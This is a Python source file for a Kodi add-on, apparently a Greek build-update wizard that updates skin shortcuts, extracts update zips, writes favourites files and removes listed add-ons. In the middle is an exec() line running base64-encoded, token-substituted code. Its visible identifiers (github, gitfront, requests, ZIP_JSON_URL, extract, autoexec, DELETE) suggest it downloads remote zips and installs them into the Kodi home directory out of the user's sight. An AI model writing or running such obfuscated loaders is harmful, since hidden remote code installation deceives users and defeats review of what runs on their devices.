# -*- coding: utf-8 -*-
import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil, sys, json
from resources.lib import extract, addoninstall, addonlinks, notify, monitor
from contextlib import contextmanager
addon = xbmcaddon.Addon()
addonid = addon.getAddonInfo('id')
addontitle = addon.getAddonInfo('name')
lang = addon.getLocalizedString
HOME = xbmcvfs.translatePath('special://home/')
USERDATA = os.path.join(HOME, 'userdata')
ADDOND = os.path.join(USERDATA, 'addon_data')
ADDONDATA = os.path.join(ADDOND, addonid)
EXTRACT_TO = HOME
BUILD_MD5S = os.path.join(ADDONDATA, 'build_md5s')
SHORTLATESTDATA = os.path.join(ADDONDATA, 'skinshortcuts_latest')
ADDONPATH = xbmcvfs.translatePath(addon.getAddonInfo('path'))
addonxml = os.path.join(ADDONPATH, 'addon.xml')
shortupdatedir = os.path.join(ADDONPATH, 'resources', 'skinshortcuts')
skinshortcutsdir = xbmcvfs.translatePath('special://home/userdata/addon_data/script.skinshortcuts/')

addonslist = addonlinks.ADDONS_REPOS
removeaddonslist = addonlinks.REMOVELIST

if not os.path.exists(BUILD_MD5S):
    os.makedirs(BUILD_MD5S)
if not os.path.exists(SHORTLATESTDATA):
    os.makedirs(SHORTLATESTDATA)

dp = xbmcgui.DialogProgressBG()
changelogfile = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'changelog.txt'))
changes = []
def percentage(part, whole):
    return 100 * float(part)/float(whole)

def versioncheck(new, old):
    a = new.split('.')
    b = old.split('.')
    if int(a[0]) > int(b[0]):
        return True
    elif int(a[0]) < int(b[0]):
        return False
    elif int(a[1]) > int(b[1]):
        return True
    elif int(a[1]) < int(b[1]):
        return False
    elif int(a[2]) > int(b[2]):
        return True
    elif int(a[2]) < int(b[2]):
        return False
    else:
        return False

def skinshortcuts(newdatapath=shortupdatedir, forcerun=False, skinreload=False, new_ver=addon.getAddonInfo('version')):
    # xbmcgui.Window(xbmcgui.getCurrentWindowId()).setProperty(addonid, "True")
    old_ver = addon.getSetting('shortcutsver')
    if old_ver == '' or old_ver is None:
        old_ver = '0.0.0'

    if forcerun == False:
        if versioncheck(new_ver, old_ver) == False:
            return

    if not os.path.exists(skinshortcutsdir):
        os.makedirs(skinshortcutsdir)

    dirs, files = xbmcvfs.listdir(newdatapath)
    total = len(files)

    if total == 0:
        addon.setSetting('shortcutsver', new_ver)
        return

    start = 0
    notify.progress('Ξεκινάει ο έλεγχος των συντομεύσεων')
    dp.create(addontitle, lang(30001))
    for item in files:
        if monitor.waitForAbort(0.2):
            dp.close()
            sys.exit()
        start += 1
        perc = int(percentage(start, total))
        if item.endswith('.hash'):
            skinhashpath = os.path.join(skinshortcutsdir, item)
            continue
        old  = os.path.join(skinshortcutsdir, item)
        new = os.path.join(newdatapath, item)
        dp.update(perc, addontitle, (lang(30001)+"...%s") % item)
        if matchmd5(old, new):
            continue
        if item.endswith('.xml') and addon.getSetting('keepmyshortcuts') == 'true':
            customshortcuts_list = []
            with xbmcvfs.File(old, 'r') as oldcontent:
                a_old = oldcontent.read()
                a_old = a_old.replace('<defaultID />', '<defaultID></defaultID>').replace('<label2 />', '<label2></label2>').replace('<icon />', '<icon></icon>').replace('<thumb />', '<thumb></thumb>')
                content = parseDOM(a_old, 'shortcut')
                disabledscuts = []
                for shortcut in content:
                    try:
                        defaultid = parseDOM(shortcut, 'defaultID')[0]
                    except:
                        defaultid = ""
                    try:
                        disabled = parseDOM(shortcut, 'disabled')[0]
                    except:
                        disabled = None
                    if defaultid.startswith(addonid) and not disabled == None:
                        disabledscuts.append(defaultid)
                        continue
                    elif defaultid.startswith(addonid):
                        continue
                    try:
                        label = parseDOM(shortcut, 'label')[0]
                    except:
                        label = ""
                    try:
                        label2 = parseDOM(shortcut, 'label2')[0]
                    except:
                        label2 = ""
                    try:
                        icon = parseDOM(shortcut, 'icon')[0]
                    except:
                        icon = ""
                    try:
                        thumb = parseDOM(shortcut, 'thumb')[0]
                    except:
                        thumb = ""
                    try:
                        visible = parseDOM(shortcut, 'visible')[0]
                    except:
                        visible = None
                    action = parseDOM(shortcut, 'action')[0]
                    customshortcuts_list.append('\n\t<shortcut>\n')
                    customshortcuts_list.append('\t\t<defaultID>'+defaultid+'</defaultID>\n')
                    customshortcuts_list.append('\t\t<label>'+label+'</label>\n')
                    customshortcuts_list.append('\t\t<label2>'+label2+'</label2>\n')
                    customshortcuts_list.append('\t\t<icon>'+icon+'</icon>\n')
                    customshortcuts_list.append('\t\t<thumb>'+thumb+'</thumb>\n')
                    customshortcuts_list.append('\t\t<action>'+action+'</action>\n')
                    if not visible == None:
                        customshortcuts_list.append('\t\t<visible>'+visible+'</visible>\n')
                    if not disabled == None:
                        customshortcuts_list.append('\t\t<disabled>'+disabled+'</disabled>\n')
                    customshortcuts_list.append('\t</shortcut>')
            buildershortcuts_list = []
            with xbmcvfs.File(new, 'r') as newcontent:
                a_new = newcontent.read()
                a_new = a_new.replace('<defaultID />', '<defaultID></defaultID>').replace('<label2 />', '<label2></label2>').replace('<icon />', '<icon></icon>').replace('<thumb />', '<thumb></thumb>')
                ncontent = parseDOM(a_new, 'shortcut')
                for nshortcut in ncontent:
                    try:
                        defaultid = parseDOM(nshortcut, 'defaultID')[0]
                    except:
                        defaultid = ""
                    try:
                        disabled = parseDOM(nshortcut, 'disabled')[0]
                    except:
                        disabled = None
                    # if defaultid.startswith(addonid) and not disabled == None:
                        # disabledscuts.append(defaultid)
                        # continue
                    # elif defaultid.startswith(addonid):
                        # continue
                    try:
                        label = parseDOM(nshortcut, 'label')[0]
                    except:
                        label = ""
                    try:
                        label2 = parseDOM(nshortcut, 'label2')[0]
                    except:
                        label2 = ""
                    try:
                        icon = parseDOM(nshortcut, 'icon')[0]
                    except:
                        icon = ""
                    try:
                        thumb = parseDOM(nshortcut, 'thumb')[0]
                    except:
                        thumb = ""
                    try:
                        visible = parseDOM(nshortcut, 'visible')[0]
                    except:
                        visible = None
                    action = parseDOM(nshortcut, 'action')[0]
                    buildershortcuts_list.append('\n\t<shortcut>\n')
                    buildershortcuts_list.append('\t\t<defaultID>'+defaultid+'</defaultID>\n')
                    buildershortcuts_list.append('\t\t<label>'+label+'</label>\n')
                    buildershortcuts_list.append('\t\t<label2>'+label2+'</label2>\n')
                    buildershortcuts_list.append('\t\t<icon>'+icon+'</icon>\n')
                    buildershortcuts_list.append('\t\t<thumb>'+thumb+'</thumb>\n')
                    buildershortcuts_list.append('\t\t<action>'+action+'</action>\n')
                    if not visible == None:
                        buildershortcuts_list.append('\t\t<visible>'+visible+'</visible>\n')
                    if not disabled == None or defaultid in disabledscuts:
                        buildershortcuts_list.append('\t\t<disabled>True</disabled>\n')
                    buildershortcuts_list.append('\t</shortcut>')
            newxml = '<shortcuts>' + ''.join(customshortcuts_list) + ''.join(buildershortcuts_list) + '\n</shortcuts>'
            with xbmcvfs.File(old, 'w') as f_new:
                f_new.write(newxml)
                changes.append(item)
        else:
            try:
                xbmcvfs.copy(new, old)
                changes.append(item)
            except:
                xbmcgui.Dialog().notification(addontitle, (lang(30002)+"...%s") % item, xbmcgui.NOTIFICATION_INFO, 1000, False)
                continue

    if len(changes) > 0:
        xbmcvfs.delete(skinhashpath)
    dp.close()
    addon.setSetting('shortcutsver', new_ver)
    if skinreload and len(changes) > 0:
        xbmc.executebuiltin('ReloadSkin()')
    notify.progress('Η ενημέρωση των συντομεύσεων ολοκληρώθηκε')
    return True


def updatezip():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('updatesver')

    if old_upd == '' or old_upd is None:
        old_upd = '0.0.0'

    if versioncheck(new_upd, old_upd) == False:
        # xbmc.executebuiltin('UpdateAddonRepos()')
        return
    notify.progress('Ξεκινάει ο έλεγχος των zip ενημέρωσης')
    updatezips = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'zips'))
    dirs, files = xbmcvfs.listdir(updatezips)
    totalfiles = len(files)

    if totalfiles == 0:
        addon.setSetting('updatesver', new_upd)
        # xbmc.executebuiltin('UpdateAddonRepos()')
        return

    zipchanges = []
    for item in files:
        if monitor.waitForAbort(0.5):
            sys.exit()
        if not item.endswith('.zip'):
            continue
        zippath = os.path.join(updatezips, item)
        newmd5 = filemd5(zippath)
        oldmd5file = xbmcvfs.translatePath(os.path.join(BUILD_MD5S, item+".md5"))
        if old_upd == '0.0.0':
            xbmcvfs.delete(oldmd5file)
        oldmd5 = xbmcvfs.File(oldmd5file,"rb").read()[:32]
        if oldmd5 and oldmd5 == newmd5:
            continue
        dp.create(addontitle, lang(30003)+"[COLOR goldenrod]"+item+"[/COLOR]")
        extract.allWithProgress(zippath, EXTRACT_TO, dp)
        xbmcvfs.File(oldmd5file,"wb").write(newmd5)
        changes.append(item)
        zipchanges.append(item)
        # xbmc.sleep(1000)
        dp.close()

    if len(zipchanges) > 0 and len(addonslist) > 0:
        addoninstall.addonDatabase(addonslist, 1, True)
        xbmc.executebuiltin('UpdateLocalAddons()')
    # xbmc.executebuiltin('UpdateAddonRepos()')
    addon.setSetting('updatesver', new_upd)
    notify.progress('Η ενημέρωση μέσω των zip ολοκληρώθηκε')

    if len(changes) > 0:
        while (xbmc.getCondVisibility("Window.isVisible(yesnodialog)") or xbmc.getCondVisibility("Window.isVisible(okdialog)")):
            xbmc.sleep(100)
        if os.path.exists(changelogfile):
            ok = xbmcgui.Dialog().ok(addontitle, lang(30004)+"[CR]"+lang(30005))
            if ok:
                textViewer(changelogfile)
        else:
            xbmcgui.Dialog().ok(addontitle, lang(30004))
        xbmc.executebuiltin('ReloadSkin()')
    return True


def SFxmls(newdatapath=shortupdatedir, forcerun=False, new_upd=addon.getAddonInfo('version')):
    old_upd = addon.getSetting('mainxmlsver')

    if old_upd == '' or old_upd is None:
        old_upd = '0.0.0'

    if forcerun == False:
        if versioncheck(new_upd, old_upd) == False:
            return
    notify.progress('Ξεκινάει η ενημέρωση SFxmls')
    xmllinks = [('19548.DATA.xml', 'Sports'), ('29958.DATA.xml', 'Kids'), ('29969.DATA.xml', 'Documentaries'),
                ('acestreams.DATA.xml', 'Acestreams'), ('a-i-o.DATA.xml', 'AllInOne'), ('ellenika.DATA.xml', 'Greek'),
                ('movies.DATA.xml', 'Movies'), ('music.DATA.xml', 'Music'), ('radio.DATA.xml', 'Radio'),
                ('replays.DATA.xml', 'Replays'), ('tvshows.DATA.xml', 'TV Shows'), ('worldtv.DATA.xml', 'WorldTV')]
    mainfolders = os.path.join(ADDONDATA, 'folders', 'Super Favourites')
    totalxmls = len(xmllinks)
    start = 0
    dp.create(addontitle, 'Ενημέρωση SFxmls')
    for item in xmllinks:
        if monitor.waitForAbort(0.2):
            dp.close()
            sys.exit()
        start += 1
        perc = int(percentage(start, totalxmls))
        skin_xml = os.path.join(newdatapath, item[0])
        folder_xml = os.path.join(mainfolders, item[1])
        dp.update(perc, addontitle, (lang(30001)+"...%s") % item[1])
        if not os.path.exists(folder_xml):
            os.makedirs(folder_xml)

        main_xml = os.path.join(folder_xml, 'favourites.xml')
        FAV_list = []
        with xbmcvfs.File(skin_xml, 'r') as xml:
            infos = xml.read()
            shortcuts = parseDOM(infos, 'shortcut')
            for shortcut in shortcuts:
                label = parseDOM(shortcut, 'label')[0]
                label2 = parseDOM(shortcut, 'label2')[0]
                if label.isdigit() is True: label = label2
                thumb = parseDOM(shortcut, 'thumb')[0]
                if thumb == '' or '<action>Ac' in thumb:
                    thumb = parseDOM(shortcut, 'icon')[0]
                else:
                    thumb = thumb
                action = parseDOM(shortcut, 'action')[0]
                if action.startswith('ActivateWindow(10025,"plugin://plugin.program.super.favourites'):
                    action = action.replace('ActivateWindow(10025,', 'RunPlugin(')

                newsf = '<favourite name="{}" thumb="{}" fanart="none">{}</favourite>'.\
                    format(label, thumb, action)
                xbmc.log('FAVOURITE: %s' % newsf)
                FAV_list.append(newsf)

        f_xml = []

        f_xml.append('<favourites>\n')
        for fav in FAV_list:
            f_xml.append('\t' + fav + '\n')

        f_xml.append('</favourites>')
        with xbmcvfs.File(main_xml, 'w') as outF:
            outF.write("".join(f_xml))

        # xbmcgui.Dialog().ok('SF XML CREATOR', 'NEW %s CREATED' % item[1])
    addon.setSetting('mainxmlsver', new_upd)
    notify.progress('Η ενημέρωση των SFxmls ολοκληρώθηκε')
    dp.close()
    return True

def addon_remover(lista=removeaddonslist):
    for removeid in lista:
        if monitor.waitForAbort(0.5):
            sys.exit()
        try:
            addonfolderpath = os.path.join(HOME, 'addons', removeid)
            if os.path.exists(addonfolderpath):
                shutil.rmtree(addonfolderpath)
                xbmc.sleep(200)
                addoninstall.addonDatabase(removeid, 2, False)
                xbmcgui.Dialog().notification(addontitle, "Αφαίρεση >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
        except BaseException:
            xbmcgui.Dialog().notification(addontitle, "Αποτυχία απεγκατάστασης >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
            continue
    xbmc.executebuiltin('UpdateLocalAddons()')
    return True

exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("NTEoIjI2IGFkOzI2IDIyIik7NTEoKGQ4IGVkLGY5OihkOCBlNyxiLGY6YWQuY2YoZTcsYixmLjI3KCc2ZS04JykpKShlMiIoWzAtOWEtZl0rKSIsZDggZjY6ZWQoZjYsZjkpLDIyLjRhKCJmMitmYSIpKSkoZDggYSxiOmJbNzIoImU2IithLjg1KDEpLDE2KV0sIjB8MXwyfDN8NHw1fGE1fGI4fDh8MTJ8YXxlYXw2YXxmM3w1MnxmfDEwfDEwMnxhY3w1YnwzM3wzOXwxNnwzYnw3fDE5fDU2fGR8NDF8YjR8MTN8NWR8MjB8NjV8ODR8ZmR8MzF8OGV8MTd8NmN8MWV8ZTR8OXxkYnwyYXwxNHxiZnw1NHwzMHw3MHwzMnwzNHxlMHwzN3w4MXw1ZXwxNXxiYXwzZHwzZXxjM3xhOHwxYnw0YnwyNHxiOXxiM3wyMXw1N3wyNXxiZHwyOHxlYnxmNHwyY3xjYnw2MXw2N3wyZHxhZXwzNXxiNnwzYXwzZnxjMnw0MHw0OXxkMXw3NHxkNnw0NHw0OHxhN3xmZnw1OXxhYnw0ZXxiMHxjfGMwfGV8ODl8OGJ8ZDV8OGR8ZTV8NWZ8ZTF8NjR8NjZ8MTh8MWF8Njl8MWR8MWZ8ZGN8NzZ8Y2V8Nzd8Nzh8Nzl8N2J8N2N8N2V8ZDd8ODJ8YmN8ODN8Mjl8MmJ8MmZ8MmV8ODZ8ODd8OTF8OGN8Mzh8Zjd8OTR8ZmJ8OTd8OTh8OWJ8YTN8YTJ8M2N8YzR8NDJ8YzZ8Yzd8Y2F8NDN8NDV8NDZ8NDd8ZTJ8YTl8NTB8NGR8YWF8NGZ8YjJ8ZWV8NTN8NTV8YmJ8YjF8NjN8YmV8NWF8NWN8Njh8NjJ8NjB8NmR8NmJ8NmZ8Zjh8NzF8NzN8NzV8Y2N8ZTh8ZmV8ZWN8N2F8ZDR8ZjV8N2Z8ZGR8N2R8Mjd8ODh8MTA0fDM2fDkyfDhmfDlkfDkwfGEwfDkzfDk2fDk5fDljfDhhfDllfDlmfGExfGYxfDk1fGE2fGFmfGYwfGI1fGI3fGMxfGRmfGM4fDZ8NmV8NzJ8Y2R8Yzl8ZGV8ZDN8YzV8MTAwfGQ5fGRhfGQyfDRjfGQwfDFjfDIzfDgwfDEwM3xlOXxlM3wxMDF8ZWZ8MTF8ZmN8YTR8NTgiLjM2KCJ8IikpKQ==")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|2|3|4|5|local_temp_filename|local_md5_filename|8|getCondVisibility|a|b|removeaddonslist|runskinshortcuts|allWithProgress|f|10|addonlinkremote|downloaded_urls|executebuiltin|local_filename|remote_md5_url|16|skinshortcuts|addonDatabase|translatePath|addon_remover|shortcutsver|waitForAbort|iter_content|versionaddon|addoninstall|20|ZIP_JSON_URL|base64|linkfilename|getAddonInfo|rmvaddonlist|import|decode|versionpath|repo_rescue|status_code|yesnodialog|mainxmlsver|reporescue|percentage|addonlinks|getSetting|setSetting|32|remote_md5|urlcontent|chunk_size|split|versionxml|textViewer|addontitle|BUILD_MD5S|updatedata|addonslist|runSFxmls|local_md5|totalurls|ADDONDATA|changelog|xbmcaddon|gggbbbuuu|isVisible|RunScript|goldenrod|gknbuilds|newverxml|oldverxml|b64decode|starturl|progress|okdialog|userdata|Finished|gitfront|exec|continue|endswith|DOWNLOAD|makedirs|requests|jsondata|filename|autoexec|filemd5|addonid|extract|monitor|version|xbmcgui|updates|timeout|replace|xbmcvfs|special|success|itemmd5|tmp_md5|Updates|create|notify|github|FAILED|stream|utf|verify|exists|RENAME|int|encode|append|rename|update|Window|DELETE|rsplit|ignore|Dialog|giturl|extend|addrep|SFxmls|folder|except|NEEDED|return|delete|group|sleep|magic|30003|False|30005|write|chunk|codes|addon|gkobu|Addon|close|30013|while|COLOR|ascii|loads|30006|30008|30009|9a|30004|30012|30011|30010|30017|30016|30015|https|30007|old_mainxmlsver|old_shortcutsver|old_updatesver|read|else|text|HOME|with|xbmc|re|link|main|None|json|home|item|path|1024|join|URLS|lang|exit|File|pass|perc|urls|elif|True|xml|x04|and|log|get|x50|rep|add|x03|str|txt|url|raw|com|len|sub|500|sys|rmv|ZIP|zip|try|not|md5|lambda|tmp|def|UpdateLocalAddons|for|NOT|MD5|x4b|SHORTLATESTDATA|ok|r|io|changelogtxt|dp|0x|o|rb|wb|if|in|is|p|as|GM|py|30014|ZTQgNGUoKToKCTYgPSAyNS4zMCgnM2UnKQoJYiA2ID09ICcnIDg5IDYgYjggNjE6CgkJNiA9ICcwLjAuMCcKCWQyID0gMjUuMzAoJ2JiJykKCWIgZDIgPT0gJycgODkgZDIgYjggNjE6CgkJZDIgPSAnMC4wLjAnCglmMiA9IDI1LjMwKCc0YScpCgliIGYyID09ICcnIDg5IGYyIGI4IDYxOgoJCWYyID0gJzAuMC4wJwoJNDMgPSAnOTA6Ly85ZC5lZC85Yi85YS8yMy9lZi1hYi9iNS9hZC5hNicKCQoJN2EgPSAnOTA6Ly9hZi5kZC85Ny80ZS9iNS9kMy84MC5iYScKCQoJNDYgPSBbN2FdCgkKCWYwID0gW10KCQoJNDYuYmUoODIuZDYpCgkKCWMuZTYoNyg4YyksIGI3PTIpCgkjIDY5LjcwKDE1LCA3KDhjKSkKCTY3OgoJCTMzID0gMWEuOTIoNDMsIDRjPTEwKQoJMzY6CgkJYy5lNig3KGNlKSwgYjc9MykKCQk3ZgoJYiAzMy4yYyA9PSAxYS42OC42YjoKCQk2NzoKCQkJNDQgPSBhNi5jOSgzMy45YykKCQkJNzMgNDIgNDggNDQ6CgkJCQkxNyA9IDQ0WzQyXQoJCQkJYiAiNGYiIDQ4IDQyOgoJCQkJCTk1ID0gMTdbIjk1Il0KCQkJCQk5NCA9IDE3WyI5NCJdCgkJCQkJN2IgPSAoOTUsIDk0KQoJCQkJCWYwLjU4KDdiKQoJCQkJYTggNDIgPT0gIjYyIjoKCQkJCQk0NSA9IDE3WyJlNSJdCgkJCQkJCgkJCQkzZDoKCQkJCQliICIxYyIgNDggNDI6CgkJCQkJCWMxID0gNDIuYzIoImYxIilbMV0KCQkJCQk0ZiA9IDE3WyI0YiJdCgkJCQkJNmQgPSAxN1siN2MiXQoJCQkJCWU5ID0gNGYuNzgoJy8nLCAxKVstMV0KCQkJCQlkID0gNDkuMWQuNTEoNTIsIChlOSArICIuN2MiKSkKCQkJCQliICcyNicgNDggZTkgNTQgNiA9PSAnMC4wLjAnOgoJCQkJCQlhNy4yMihkKQoJCQkJCWE4ICIxYyIgNDggZTkgNTQgZDIgPT0gJzAuMC4wJzoKCQkJCQkJYTcuMjIoZCkKCQkJCQkxMSA9IGE3LjM5KGQsImI2IikuNWMoKVs6MzJdCgkJCQkJYiAxMSA1NCAxMSA9PSA2ZDoKCQkJCQkJMTIuM2MoKCJbJTVkXSAyZiBiZCA3ZDogIiAlIDEzKSArIGU5KQoJCQkJCQllCgkJCQkJYiA0ZiA0OCA0NjoKCQkJCQkJZQoJCQkJCTQ2LjU4KDRmKQoJCTM2OgoJCQljLmU2KDcoY2IpLCBiNz0zKQoJM2Q6CgkJYy5lNig3KGMzKSwgYjc9MykKCWIgNTkgNzUoZjApID4gMDoKCQlmMCA9IDkxCgllYSA9IDlmCgk2NzoKCQliIDU5IDQ5LjFkLjMxKGE3LjE5KGVhKSk6CgkJCTQ5LmE0KGE3LjE5KGVhKSkKCTM2OgoJCWE1Cgk1MyA9IDc1KDQ2KQoJM2YgPSAwCgk5ID0gW10KCTFiID0gNjUKCTNhID0gNjUKCTczIDRiIDQ4IDQ2OgoJCWIgIjFjLjk2IiA0OCA0YjoKCQkJZWEgPSA1NQoJCTNkOgoJCQllYSA9IDlmCgkJYiAxZi5lOCgwLjUpOgoJCQk1Ny40MSgpCgkJM2YgKz0gMQoJCTdlID0gZGMoODMoM2YsIDUzKSkKCQlmMyA9IDRiLjc4KCcvJywgMSlbLTFdCgkJYiA1OSBmMzoKCQkJZQoJCTJkID0gNDkuMWQuNTEoZWEsIGYzKQoJCWRhID0gMmQgKyAiLmUzIgoJCTE4ID0gNDkuMWQuNTEoNTIsIChmMyArICIuN2MiKSkKCQkzOCA9IDRiICsgIi43YyIKCgkJM2IgPSBhNy4zOSgxOCwiYjYiKS41YygpWzozMl0KCQkxNCA9IDYxCgkJNjc6CgkJCTliID0gMWEuOTIoMzgsIDRjPTEwKQoJCQliIDliLjJjID09IDFhLjY4LjZiOgoJCQkJMTQgPSA5Yi45Yy5iMygnZDEnLCAnYjknKVs6MzJdLmJmKCdkYi04JykKCQkzNjoKCQkJYTUKCgkJYiAzYiA1NCAxNCA1NCAzYiA9PSAxNDoKCQkJMTIuM2MoKCJbJTVkXSAyZiBiZCA3ZDogIiAlIDEzKSArIGYzKQoJCQllCgkJYy5lNigoNyg4ZikrIltiMV0uLi4lNWQiKSAlIGYzKQoJCSMgNjkuNzQoN2UsIDE1LCAoNyg4ZikrIi4uLiU1ZCIpICUgZjMpCgkJNWYgYTcuMzkoZGEsImViIikgYTIgZjoKCQkJNjc6CgkJCQk5YiA9IDFhLjkyKDRiLCBhZT0yZSwgYjA9NjUsIDRjPTIwKQoJCQkJYiA5Yi4yYyA9PSAxYS42OC42YjoKCQkJCQk1MCA9IDE2ICogZDUKCQkJCQk3MyA4NyA0OCA5Yi43MSg1MCk6CgkJCQkJCWYuNjYoODcpCgkJCQkJOS41OCg0YikKCQkJCTNkOgoJCQkJCTEyLjNjKCgiWyU1ZF0gMjcgOGIgMmY6ICIgJSAxMykgKyBmMykKCQkJCQlhNy4yMihkYSkKCQkJCQllCgkJCTM2OgoJCQkJMTIuM2MoKCJbJTVkXSAyNyA4YiAyZjogIiAlIDEzKSArIGYzKQoJCQkJYTcuMjIoZGEpCgkJCQllCgkJNGQgPSBhOShkYSkKCgkJYiAxNCA1NCA0ZCAhPSAxNDoKCQkJMTIuM2MoKCJbJTVkXSAyNyBkZjogIiAlIDEzKSArIGYzKQoJCQllCgoJCWIgNDkuMWQuMzEoMmQpOgoJCQkyMSA9IGE3LjIyKDJkKQoJCQliIDU5IDIxOgoJCQkJMTIuM2MoKCJbJTVkXSAyNyA4YiA3NzogIiAlIDEzKSArIDJkKQoJCQkJZQoKCQkyMSA9IGE3LmI0KGRhLDJkKQoJCWIgNTkgMjE6CgkJCTEyLjNjKCgiWyU1ZF0gMjcgOGIgYjI6ICIgJSAxMykgKyAyZCkKCQkJYTcuMjIoZGEpCgkJCWUKCgkJNWYgYTcuMzkoMTgsImVjIikgYTIgYToKCQkJYS42Nig0ZCkKCQk4NSA9IGE3LjM5KDJkLCJiNiIpLjVjKDQpCgkJYiA4NSA9PSAiXGUxXGQ4XGQ5XGQ3IjoKCQkJNjkuNzAoMTUsIDcoYzApKyJbOGEgOTldIitmMysiWy84YV0iKQoJCQlhYS42NCgyZCwgZWEsIDY5KQoJCQljLmU2KCgiJTVkLi4uW2IxXSIrNyg4ZCkpICUgZjMpCgkJCTY5Ljg2KCkKCQkJYiAiMjYuYmEiIDQ4IDJkOgoJCQkJMWIgPSAyZQoJCQkJM2EgPSAyZQoJCQkjIDY5Ljc0KDdlLCAxNSwgKCIlNWQuLi4iKzcoOGQpKSAlIGYzKQoJCQkjIDEyLjg0KGU3KQoJCQliIDQ5LjFkLjMxKDJkKToKCQkJCTIxID0gYTcuMjIoMmQpCgkJCQliIDU5IDIxOgoJCQkJCTEyLjNjKCgiWyU1ZF0gMjcgOGIgNzcgZTA6ICIgJSAxMykgKyAyZCkKCTEyLjNjKCJbJTVkXSBhMCAlNWQiICUgKDEzLCBmMykpCgliIDFiOgoJCTI1LjI0KCczZScsICcwLjAuMCcpCgkJMjYoMzQsIDJlLCAyZSwgYzEpCgliIDNhIDg5IGYyID09ICcwLjAuMCc6CgkJMjUuMjQoJzRhJywgJzAuMC4wJykKCQliYygzNCwgMmUsIGMxKQoJYiA3NSg5KSA|local_linkfilename|os|updatesver|m|or|CR|y|IDA6CgkJYy5lNig3KGQwKSAlIGRlKDc1KDkpKSkKCQk3Mi42ZShmMCwgMSwgMmUpCgkJMTIuMWUoJzJiKCknKQoJCWIgMWYuZTgoMyk6CgkJCTU3LjQxKCkKCQkyOCA9IDkzLmM2KCczNy5jNCcpCgkJNDcgPSBhNy4xOSgyOC40MCgnMWQnKSkKCQkzNSA9IDQ5LjFkLjUxKDQ3LCAnMjUuNjMnKQoJCTczIGVlIDQ4IDk6CgkJCWIgZWUuYTMoJzFjLjk2Jyk6CgkJCQkyNS4yNCgnYmInLCAnMC4wLjAnKQoJCQkJNmYoNDUpCgkJCQliIDFmLmU4KDMpOgoJCQkJCTU3LjQxKCkKCQkJCTVmIGE3LjM5KDM1LCAnOWInKSBhMiA1NjoKCQkJCQk2MyA9IDU2LjVjKCkKCQkJCQk2MyA9IDYzLmFjKCczNz0iJTVkIicgJSAyOC40MCgnMzcnKSwgJzM3PSIlNWQiJyAlIGMxKQoJCQkJNWYgYTcuMzkoMzUsICdlYicpIGEyIDViOgoJCQkJCTViLjY2KDYzKQoJCQkJYiAxZi5lOCgxKToKCQkJCQk1Ny40MSgpCgkJCQkyNS4yNCgnYmInLCBjMSkKCQkJCTI5ID0gNDkuMWQuNTEoNTUsICIxYy45NiIpCgkJCQkxMi4xZSgnMmIoKScpCgkJCQljOCAoMTIuMmEoIjc2LjVhKDgxKSIpIDg5IDEyLjJhKCI3Ni41YSg5ZSkiKSk6CgkJCQkJMTIuODQoZTIpCgkJCQliIDQ5LjFkLjMxKDI5KToKCQkJCQk2YiA9IDZhLjc5KCkuNmIoMTUsIDcoOGUpKyJbYjFdIis3KGNjKSkKCQkJCQliIDZiOgoJCQkJCQk4OCgyOSkKCQkJCTNkOgoJCQkJCTZhLjc5KCkuNmIoMTUsIDcoOGUpKQoJCQkJYy5lNig3KGNmKSAlIGMxLCBiNz0yKQoJM2Q6CgkJYy5lNig3KGM3KSwgYjc9MikKCSMgNjkuODYoKQoJIyBjLmU2KDcoY2EpKQoJIyBjLmU2KDcoY2QpKQoJCgliIDQ5LjFkLjMxKGE3LjE5KCc2YzovL2ExLzYwLzVlLmQ0JykpOgoJCWIgMWYuZTgoMC41KToKCQkJNTcuNDEoKQoJCTEyLjFlKCc5OCg2YzovL2ExLzYwLzVlLmQ0KScpCgliIDFmLmU4KDAuNSk6CgkJNTcuNDEoKQoJYy5lNig3KGM1KSkKCTdmIDJl|TO|_|4afd12ecadd18930fa40d1c5e51453721572757a|t|s|100|x|md5_local_linkfilename|w|build_update_version".split("|")))

def textViewer(file, heading=addontitle, monofont=True):
    xbmc.sleep(200)
    if not os.path.exists(file):
        w = open(file, 'w')
        w.close()
    with open(file, 'rb') as r:
        text = r.read().decode('utf-8', errors='replace')
    if not text: text = ' '
    head = '%s' % heading
    return xbmcgui.Dialog().textviewer(head, text, monofont)


def filemd5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def matchmd5(old, new):
    try:
        old_md5 = filemd5(old)
        new_md5 = filemd5(new)
    except:
        return False
    if old_md5 == new_md5: return True
    else: return False


def parseDOM(html, name="", attrs={}, ret=False):
    # Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen
    import re
    if isinstance(html, str):
        try:
            html = [html.decode("utf-8")]
        except:
            html = [html]
    elif isinstance(html, str):
        html = [html]
    elif not isinstance(html, list):
        return ""

    if not name.strip():
        return ""

    ret_lst = []
    for item in html:
        temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
        for match in temp_item:
            item = item.replace(match, match.replace("\n", " "))

        lst = []
        for key in attrs:
            lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
            if len(lst2) == 0 and attrs[key].find(" ") == -1:
                lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

            if len(lst) == 0:
                lst = lst2
                lst2 = []
            else:
                test = list(range(len(lst)))
                test.reverse()
                for i in test:
                    if not lst[i] in lst2:
                        del(lst[i])

        if len(lst) == 0 and attrs == {}:
            lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
            if len(lst) == 0:
                lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

        if isinstance(ret, str):
            lst2 = []
            for match in lst:
